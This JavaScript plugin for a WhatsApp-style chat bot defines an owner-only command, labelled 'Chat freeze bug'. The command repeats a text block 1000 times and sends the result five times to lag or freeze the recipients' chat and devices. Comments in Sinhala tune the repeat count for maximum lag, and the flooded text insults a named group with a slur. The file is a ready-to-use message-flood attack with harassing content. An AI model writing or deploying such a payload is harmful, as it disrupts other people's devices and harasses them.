const { cmd } = require('../command');

cmd({
    pattern: "gptpons",
    alias: ["gptp"],
    react: "🍑",
    desc: "Chat freeze bug 😈",
    category: "fun",
    filename: __filename
},
async (robin, mek, m, { from, isCreator, reply }) => {
    try {
        // 🔐 Owner Check - Creator නෙවෙයි නම් මෙතනින් නවතිනවා
        if (!isCreator) return reply("*🚫 Owner only command!*");

        // Text එක repeat කරන ප්‍රමාණය (අවශ්‍ය පරිදි වෙනස් කරන්න)
        // Repeat 1000ක් වගේ දැම්මම ඇති lag වෙන්න
        let heavyText = "```GLITCH PHANTOMS THAMA HUTTO PONNAYO INNE👻```\n" +
                         "*\"GLITCH PHANTOMS නම් පොන්නයො තමයි..🫃\"*\n\n";

        let bugMessage = heavyText.repeat(1000); 

        // 📩 Message එක 5 පාරක් යවනවා
        for (let i = 0; i < 5; i++) {
            await robin.sendMessage(from, {
                text: bugMessage
            }, { quoted: m });
        }

    } catch (e) {
        console.log(e);
        reply("An error occurred while sending the message.");
    }
});
